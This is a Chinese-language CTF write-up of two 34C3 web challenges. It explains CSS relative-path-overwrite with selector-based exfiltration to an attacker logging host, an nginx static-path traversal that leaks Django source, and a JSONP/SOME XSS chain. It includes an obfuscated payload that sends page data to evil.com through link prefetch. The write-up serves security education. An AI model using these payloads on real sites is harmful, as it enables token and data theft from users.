---
title: 34c3 Web部分Writeup
date: 2018-01-02 18:03:48
tags:
- xss
- ctf
- csrf
---
34c3作为ctftime很少见的高权重比赛仍然没让人失望，提供了足够好的题目质量，其中有3题是和xss有关系的，很有趣

这里整理了一下Writeup给大家

<!--more-->


# urlstorage #

初做这题目的时候感觉又很多问题，本以为最后使用的方法是正解，没想到的是非预期做法，忽略了题目本身的思路，抛开非预期不管，题目本身是一道非常不错的题目，用了css rpo来获取页面的敏感内容。

## CSS RPO ##

首先我们需要先解释一下什么是CSS RPO,RPO 全称Relative Path Overwrite，主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。

先放几篇文章
[http://www.thespanner.co.uk/2014/03/21/rpo/](http://www.thespanner.co.uk/2014/03/21/rpo/)
[http://www.zjicmisa.org/index.php/archives/127/](http://www.zjicmisa.org/index.php/archives/127/)

这里就不专门讲述RPO的种种攻击方式，这里只讨论CSS RPO，让我们接着看看题目。

## Writeup ##

回到题目。

整个题目站点是django写的，然后前台用nginx做了一层反代。
![image.png-135.8kB][1]

然后整站带有CSP
```
frame-ancestors 'none'; form-action 'self'; connect-src 'self'; script-src 'self'; font-src 'self' ; style-src 'self';
```

站点内主要有几个功能，每次登陆都会生成独立的token，`/urlstorage`页面可以储存一个url链接，`/flag`页面会显示自己的token和flag（根据token生成）

仔细研究不难发现一些其他的条件。

1、flag页面只接受token的前64位，而token则是截取了token的前32位做了判断，在token后我们可以加入32位任意字符。
2、flag页面有title xss，只要闭合`</title>`就可以构造xss，虽然位数不足，我们没办法执行任何js。
3、urlstorage页面存在csrf，我们可以通过让服务端点击我们的链接来修改任意修改url

但是，很显然，这些条件其实并不够足以获取到服务端的flag。

但题目中永远不会出现无意义的信息，比如urlstorage页面，在刚才的讨论中，urlstorage页面中修改储存url的功能可以说毫无意义，这时候就要提到刚才说的RPO了。

首先整个站点是django写的，所有页面都是通过路由表实现的，所以无论我们在后面加入什么样的链接，返回页面都是和urlstorage一样的
```
http://35.198.114.228/urlstorage/random_str/1321321421
-->
http://35.198.114.228/urlstorage
```

看上去好像没什么问题，但是页面内的静态资源是通过相对路径引入的。

![image.png-102.4kB][2]

因为我们修改了根url，所以css的引入url变成了
![image.png-158.8kB][3]

我们把当前页面当做成css样式表引入到了页面内。

这里我们可以通过设置url来向页面中加入一些可以控制的页面内容。

这里涉及到一个小技巧：
**CSS在加载的时候与JS一样是逐行解析的，不同的是CSS会忽略页面中不符合CSS语法的行**

也就是说如果我们设置url为`%0a{}%0a*{color:red}`

那么页面内容会变成
![image.png-37.6kB][4]

当引入CSS逐行解析的时候，`color:red`就会被解析

![image.png-65.4kB][5]

通过设置可控的css，我们就可以使用一个非常特别的攻击思路。

我曾经在讲述CSP的博客中提到了这种攻击思路，通过CSS选择器来读取页面内容
[https://lorexxar.cn/2017/10/25/csp-paper/#1、nonce-script-CSP-Bypass](https://lorexxar.cn/2017/10/25/csp-paper/#1、nonce-script-CSP-Bypass)

```
a[href^=flag\?token\=0]{background: url(//l4w.io/rpo/logging.php?c=0);}
a[href^=flag\?token\=1]{background: url(//l4w.io/rpo/logging.php?c=1);}
..
a[href^=flag\?token\=f]{background: url(//l4w.io/rpo/logging.php?c=f);}
```

当匹配a标签的href属性中token开头符合的时候，就会自动向远程发送请求加载图片，服务端接收到请求，就代表着匹配成功了，这样的请求我们可以重复多次，就能获取到admin的token了。

这里有个小细节，服务端每次访问都会重新登陆一次，每次重新登陆都会刷新token，所以题目在contact页面还给出了一个脚本pow.py，通过这个脚本，服务端会有30s时间来访问我们的所有url，这样我们就有足够的时间拿到服务端的token。

但是问题来了，我们仍然没办法获取到flag页面的flag。

这里需要一个新的技巧。

在浏览器处理相对路径时，一般情况是获取当前url的最后一个`/`前作为base url，但是如果页面中给出了base标签，那么就会读取base标签中的url作为base url。

那么，既然flag页面的token参数，我们有24位可控，那么我们完全可以引入`/urlstorage`作为base标签，这样CSS仍然会加载urlstorage页面内容，我们就可以继续使用CSS RPO来获取页面内容。

这里还有个小坑

当我们试图使用下面的payload来获取flag时
```
#flag[value^=34C3]{background: url(https://xxx?34c3);}
```
字符串首位的3不会被识别为字符串，必须使用双引号包裹才能正常解析。但是双引号被转义了。

这里我们需要换用`*`

```
*号选择器代表这属性中包含这个字段，由于flag中有_存在，所以不会对flag的获取有影响
```

payload如下
```
#flag[value*=C3_1]{background: url(//l4w.io/rpo/logging.php?flag=C3_1);}
#flag[value*=C3_0]{background: url(//l4w.io/rpo/logging.php?flag=C3_1);}
..
#flag[value*=C3_f]{background: url(//l4w.io/rpo/logging.php?flag=C3_1);}
```

完全的payload我就不专门写了，理解题目的思路比较重要。

整个题目的利用链非常精巧，服务端bot比我想象中要强大很多，有趣的是，整个题目存在配置的非预期，我一度认为非预期解法是正解。

## 非预期 ##

以前在pwnhub第二期中曾经接触到过一个知识点，django的静态资源路由（static）本身就是通过映射静态资源目录实现的，当django使用nginx做反代时，如果nginx配置出现问题，那么就有可能存在导致可以跨目录的读取文件，导致源码泄露。34c3的所有django的web题目都有这个漏洞。

当我们访问
```
http://35.198.114.228/static../views.py
```

就可以获取到源码，让我们锁定flag页面的源码
```
@login_required
def flag(req):
    user_token = req.GET.get("token")
    if not user_token:
        messages.add_message(req, messages.ERROR, 'no token provided')
        return redirect('index')
    user_flag = "34C3_"+hashlib.sha1("foqweqdzq%s".format(user_token).encode("utf-8")).hexdigest()
    return render(req, 'flag.html', dict(user=req.user, 
        valid_token=user_token.startswith(req.user.profile.token), 
        user_flag=user_flag,
        user_token=user_token[:64],))
```

我们可以看到user_flag是通过token生成的，而token是登陆时随机生成的

```
def login(req):
    if req.user.is_authenticated:
        return redirect('index')

    if req.method == "POST":
        username = req.POST.get("username")
        password = req.POST.get("password")
        if not username or not password:
            messages.add_message(req, messages.ERROR, 'No username/password provided')
        elif len(password) < 8:
            messages.add_message(req, messages.ERROR, 'Password length min 8.')
        else:
            user, created = User.objects.get_or_create(username=username)
            if created:
                user.set_password(password)
                user.save()
            user = auth.authenticate(username=username, password=password)
            if user:
                user.profile.token = binascii.hexlify(os.urandom(16)).decode()
                user.save()
                auth.login(req, user)
                return redirect('index')
            else:
                messages.add_message(req, messages.ERROR, 'Invalid password')

            return render(req, 'login.html')
    return render(req, 'login.html')
```

所以不难想象到，如果admin的flag也随机生成，那flag就不固定了，所以admin的flag一定是写死在模板里的。

![image.png-298.5kB][6]

很容易就拿到了flag。

# superblog #

这道题目做起来没有urlstorage有趣，但是仍然值得一做。

下面的思路部分来自于
[https://blog.cal1.cn/post/34C3%20CTF%20web%20writeup](https://blog.cal1.cn/post/34C3%20CTF%20web%20writeup)

有趣的是，这道题目也是用django写的，也是用了nginx做反代，于是源码再一次泄露了，通过源码我们可以简化很多思路。

在分析源码之前，我们可以简单的从黑盒的角度看看题目的各种信息。

1、首先从feed页面可以发现，django 1.11.8 开启了debug
然后我们可以拿到路由表
```
^$ [name='index']
^post/(?P<postid>[^/]+)$ [name='post']
^flag1$ [name='flag1']
^flag2$ [name='flag2']
^flag_api$ [name='flag_api']
^publish$ [name='publish']
^feed$ [name='feed']
^contact$ [name='contact']
^login/$ [name='login']
^logout/$ [name='logout']
^signup/$ [name='signup']
^static\/(?P<path>.*)$
```
同时还会泄露部分源码，可以发现flag1和flag2的获取方式分别为

1、admin账号访问flag1就可以得到flag1
2、flag2需要向flag_api发送请求

2、feed有一个`type`参数可以指定json、jsonp的返回类型，同时还接受cb参数，cb中有很多很多过滤，但是可以被绕过
```
<script src=’/feed?type=jsonp&cb=alert`a`;’ ></script>
```

3、页面中有比较严格的CSP
```
default-src 'none'; base-uri 'none'; frame-ancestors 'none'; connect-src 'self'; img-src 'self'; style-src 'self' https://fonts.googleapis.com/; font-src 'self' https://fonts.gstatic.com/s/materialicons/; form-action 'self'; script-src 'self';
```

4、content没有任何转义，存在XSS漏洞

5、bot访问的是本地的django，而不是nginx
```
superblog1 + superblog2 information
When submitting a post ID to the admin, he will visit the URL http://localhost:1342/post/<postID>.
He uses a headless Google Chrome, version 63.0.3239.108.
```

其实题目不需要完整源码，我们仍然可以想到差不多的思路，这里我们再从源码的角度分析一下，便于理解。

```
views.py

import re
import json
import traceback
import random

from django.http import HttpResponse
from django.shortcuts import redirect, render
from django.template import loader
from django.views.decorators.http import require_safe, require_POST
from django.contrib.auth.decorators import user_passes_test
from django.core.exceptions import PermissionDenied
from django.contrib.auth import login, authenticate
from django.contrib.auth.forms import UserCreationForm
from django.contrib import messages
import models
from random import SystemRandom

def get_user_posts(user):
    if not user.is_authenticated:
        return []
    else:
        return models.Post.objects.filter(author=user).all()

gen = SystemRandom()
def generate_captcha(req):
    n = 2
    d = 8
    ops = '+'
    while True:
        nums = [gen.randint(10**(d-1), 10**d-1) for _ in range(n)]
        ops = [gen.choice(ops) for _ in range(n-1)]
        captcha = ' '.join('%s %s' % a for a in zip(nums,ops+[1]))[:-2]
        answer = eval(captcha)
        if -2**31 + 10 <= answer <= 2**31-10:
            break
    # print 'Captcha:', captcha
    req.session['captcha'] = captcha
    req.session['captcha_answer'] = str(eval(captcha))
    if random.random() < 0.003:
        req.session['captcha'] = r'(__import__("sys").stdout.write("I WILL NOT RUN UNTRUSTED CODE FROM THE INTERNET\n"*1337), %s)[1]'%req.session['captcha']
    return req.session.get('captcha')

def check_captcha(req):
    res = req.POST.get('captcha_answer') == req.session.get('captcha_answer')
    # if not res:
        # print 'Captcha failed:', req.POST.get('captcha_answer'), req.session.get('captcha_answer')
    return res

@require_safe
def index(req):
    if not req.user.is_authenticated:
        return redirect('login')
    return render(req, 'blog/index.html', {
        'posts': get_user_posts(req.user),
        'captcha': generate_captcha(req),
        })

@require_safe
def post(req, postid):
    post = models.Post.objects.get(secretid=postid)
    return render(req, 'blog/post.html', {
        'post': post,
        'captcha': generate_captcha(req),
        })

def contact(req):
    if req.method == 'POST':
        if not check_captcha(req):
            messages.add_message(req, messages.ERROR, 'Invalid or outdated captcha')
            return redirect('contact')
        postid = req.POST.get('postid')
        valid = False
        try:
            models.Post.objects.filter(secretid=postid).get()
            valid = True
        except:
            traceback.print_exc()

        if not valid:
            messages.add_message(req, messages.ERROR,
                'That does not look like a valid post ID')
            return redirect('contact')
        url = 'http://localhost:1342/post/' + postid
        models.Feedback(url=url).save()
        messages.add_message(req, messages.INFO,
                'Thank you for your feedback, an admin will look at it ASAP')
        return redirect('index')
    else:
        feedback_count = models.Feedback.objects.filter(visited=False).count()
        return render(req, 'blog/contact.html', {
            'feedback_count': feedback_count,
            'captcha': generate_captcha(req),
            })

def signup(req):
    if req.method == 'POST':
        form = UserCreationForm(req.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get('username')
            raw_password = form.cleaned_data.get('password1')
            user = authenticate(username=username, password=raw_password)
            login(req, user)
            return redirect('index')
    else:
        form = UserCreationForm()
    return render(req, 'blog/signup.html', {'form': form})

def get_flag(req, num):
    if req.user.username == 'admin' and req.META.get('REMOTE_ADDR') == '127.0.0.1':
        with open('/asdjkasecretflagfile%d' % num) as f:
            return f.read()
    else:
        return '34C3_JUSTKIDDINGGETADMINANDACCESSFROMLOCALHOSTNOOB'

@require_safe
def feed(req):
    posts = get_user_posts(req.user)
    posts_json = json.dumps([
        dict(author=p.author.username, title=p.title, content=p.content)
        for p in posts])
    type_ = req.GET.get('type')
    if type_ == 'json':
        resp = HttpResponse(posts_json)
        resp['Content-Type'] = 'application/json; charset=utf-8'
    elif type_ == 'jsonp':
        callback = req.GET.get('cb')
        bad = r'''[\]\\()\s"'\-*/%<>~|&^!?:;=*%0-9[]+'''
        if not callback.strip() or re.search(bad, callback):
            raise PermissionDenied
        resp = HttpResponse('%s(%s)' % (callback, posts_json))
        resp['Content-Type'] = 'text/javascript; charset=utf-8'
    return resp

@require_POST
def publish(req):
    if req.user.username == 'admin':
        messages.add_message(req, messages.INFO,
                'Sorry but admin cannot post for security reasons')
        return redirect('/')

    if not check_captcha(req):
        messages.add_message(req, messages.ERROR, 'Invalid or outdated captcha')
        return redirect('/')

    models.Post(author=req.user,
            content=req.POST.get('post'),
            title=req.POST.get('title')).save()
    return redirect('/')

@require_POST
def flag_api(req):
    if not check_captcha(req):
        raise PermissionDenied
    resp = HttpResponse(json.dumps(get_flag(req, 2)))
    resp['Content-Type'] = 'application/json; charset=utf-8'
    return resp

@require_safe
def flag1(req):
    return render(req, 'blog/flag1.html', {'flag': get_flag(req, 1)})

@require_safe
def flag2(req):
    return render(req, 'blog/flag2.html', {'captcha': generate_captcha(req)})

```

1、flag获取首先有一个前置条件
```
def get_flag(req, num):
    if req.user.username == 'admin' and req.META.get('REMOTE_ADDR') == '127.0.0.1':
        with open('/asdjkasecretflagfile%d' % num) as f:
            return f.read()
    else:
        return '34C3_JUSTKIDDINGGETADMINANDACCESSFROMLOCALHOSTNOOB'
```

后一个条件由于经过nginx反代，所以没什么用，主要问题是前一个。

req.user.username并不是通过django本身的session设置的，所以即使我们获取到settings中的SECRET_KEY也没有意义，也就是说，我们只能通过bot获取flag。

2、feed页面存在jsonp接口，但是有大把多过滤，忽略了能用上的``{}.$`这几个
```
@require_safe
def feed(req):
    posts = get_user_posts(req.user)
    posts_json = json.dumps([
        dict(author=p.author.username, title=p.title, content=p.content)
        for p in posts])
    type_ = req.GET.get('type')
    if type_ == 'json':
        resp = HttpResponse(posts_json)
        resp['Content-Type'] = 'application/json; charset=utf-8'
    elif type_ == 'jsonp':
        callback = req.GET.get('cb')
        bad = r'''[\]\\()\s"'\-*/%<>~|&^!?:;=*%0-9[]+'''
        if not callback.strip() or re.search(bad, callback):
            raise PermissionDenied
        resp = HttpResponse('%s(%s)' % (callback, posts_json))
        resp['Content-Type'] = 'text/javascript; charset=utf-8'
    return resp
```

3、整站的返回头是通过django middleware 添加，但是static目录是直接通过nginx处理的，所以没有CSP头


题目思路完整了，我们就需要构造可以利用的攻击链

无论我们怎么获取flag，我们都需要通过操作static页面来执行js传出，否则就会被CSP拦截，所以我们必须通过多个页面来相互操作修改页面，才能实现我们的需求。

这里需要用到一个在HCTF2017中提到过的攻击方式，叫做SOME.

关于SOME的细节可以看以前的博客
[https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/](https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/)

这里就不细讲了，通过SOME，我们可以通过执行js来操作另一个页面中的dom

执行流程大致如下
1、打开页面，通过a标签的的click来实现页面的跳转，跳转至localhost（nginx）下
```
<a id="aa" href="http://localhost/post/{post1}"></a>
<script src="/feed?type=jsonp&amp;cb=document.getElementById`aa`.click``,console.log"></script>
```
2、先拿flag1，两次点击，一个打开flag1页面，一个跳转到下一个js页面
```
<a id="aa" href="{post2}" target="_blank"></a>
<a id="bb" href="/flag1"></a>
<script src="/feed?type=jsonp&cb=document.getElementById`aa`.click``,document.getElementById`bb`.click``,console.log"></script>
```

3、通过两次点击，打开一个static目录的页面，然后跳转到下一个js执行的页面
```
<a id="aa" href="{post3}" target="_blank"></a>
<a id="bb" href="/static/"></a>
<script src="/feed?type=jsonp&cb=document.getElementById`aa`.click``,document.getElementById`bb`.click``,console.log"></script>
```

4、通过向static页面写入外部js来执行任意js代码，为了更好的处理，payload可以写入标题，写入代码可以写在内容里。
```
标题：<script src="http://xxxxx/evil.js"></script>
内容：<script src="/feed?type=jsonp&cb=opener.document.write`${document.body.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.innerText}`,console.log"></script>
```

接下来就是随意开火了，因为evil.js里没有任何限制，你可以做任何需要的操作。

一个完整的利用链就形成了

有趣的是，这个题目是可以强行绕waf来执行js的。

## 另一种解法 ##

在ctftime的writeup区域，看到了一种强行绕过waf的解法

[https://gist.github.com/cgvwzq/2d875cb4bd752a99ca239e6ffe64f849](https://gist.github.com/cgvwzq/2d875cb4bd752a99ca239e6ffe64f849)

上面曾经提到过，关于符号的过滤，遗留下了几个特别的还能利用的字符``{}.$`,没想到的是，通过这几个字符，可以强行构造可执行的js

```
<!-- superblog 1 - flag: 34C3_so_y0u_w3nt_4nd_learned_SOME_javascript_g00d_f0r_y0u -->
<script>
document.write`${Array.call`${atob`PA`}${`l`}${`i`}${`n`}${`k`}${atob`IA`}${`r`}${`e`}${`l`}${atob`PQ`}${atob`Ig`}${`p`}${`r`}${`e`}${`f`}${`e`}${`t`}${`c`}${`h`}${atob`Ig`}${atob`IA`}${`h`}${`r`}${`e`}${`f`}${atob`PQ`}${atob`Ig`}${`h`}${`t`}${`t`}${`p`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`evil`}${atob`Lg`}${`com`}${atob`Og`}${atob`Lw`}${Math.random``}${`_`}${escape.call`${document.getElementsByTagName`link`.item``.import.body.innerText}`}${atob`Ig`}${atob`Pg`}`.join``}`,
</script>
  
<!-- superblog 2 - flag: 34C3_h3ncef0rth_peopl3_sh4ll_refer_t0_y0u_only_4s_th3_ES6+DOM_guru -->
<script>
document.write`${foo.import.body.innerHTML}`,document.write`${Array`${atob`PA`}${`input`}${atob`IA`}${`form`}${atob`PQ`}${`flagform`}${atob`IA`}${`name`}${atob`PQ`}${`captcha_answer`}${atob`IA`}${`x`}${atob`PQ`}${atob`Ig`}`.join``}${atob`Ig`}${`value`}${atob`PQ`}${parseInt.call`${foo.import.getElementById`flagform`.firstChild.nextSibling.nextSibling.textContent.split`%2b`.shift``}`%2bparseInt.call`${foo.import.getElementById`flagform`.firstChild.nextSibling.nextSibling.textContent.split`%2b`.pop``}`}${atob`Pg`}`,document.write`${atob`PA`}${`script`}${atob`IA`}${`src`}${atob`PQ`}${atob`Lw`}${`feed`}${atob`Pw`}${`type`}${atob`PQ`}${`jsonp`}${atob`Jq`}${`cb`}${atob`PQ`}${`flagform.lastElementChild.click`}${atob`YA`}${atob`YA`}${`,document.write${atob`YA`}${atob`JA`}${`{localStorage.getItem`}${atob`YA`}${`$`}${`{`}${atob`YA`}${atob`YA`}${`}`}${atob`YA`}${`}`}${`$`}${`{flag.innerText}`}${atob`YA`}${`,`}${atob`Pg`}${atob`PA`}${atob`Lw`}${`script`}${atob`Pg`}`}`,localStorage.setItem`${Array.call`}${atob`PA`}${`link`}${atob`IA`}${`rel`}${atob`PQ`}${atob`Ig`}${`prefetch`}${atob`Ig`}${atob`IA`}${`href`}${atob`PQ`}${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`evil`}${atob`Lg`}${`com`}${atob`Og`}${atob`Lw`}${Math.random``}${`_`}`.join``}`,
</script>
```

其中所有的敏感符号通过解base64获得，然后写入页面内执行

最后通过
```
<link rel="prefetch" href="xxxxx.xx">
```

把数据传出...

  [1]: http://static.zybuluo.com/LoRexxar/r67ihy6epkvcnkqvnqulsvjl/image.png
  [2]: http://static.zybuluo.com/LoRexxar/sgxf9gq2ni5i7osmlm17vzry/image.png
  [3]: http://static.zybuluo.com/LoRexxar/23ujazb8yck2rnzy9b6ow02s/image.png
  [4]: http://static.zybuluo.com/LoRexxar/nptyaixmrkwgizd1bce9yhe3/image.png
  [5]: http://static.zybuluo.com/LoRexxar/2tmhyv1f575lfz6apaeg0o4q/image.png
  [6]: http://static.zybuluo.com/LoRexxar/9tys2vihqrm3xznatpwkjzkm/image.png
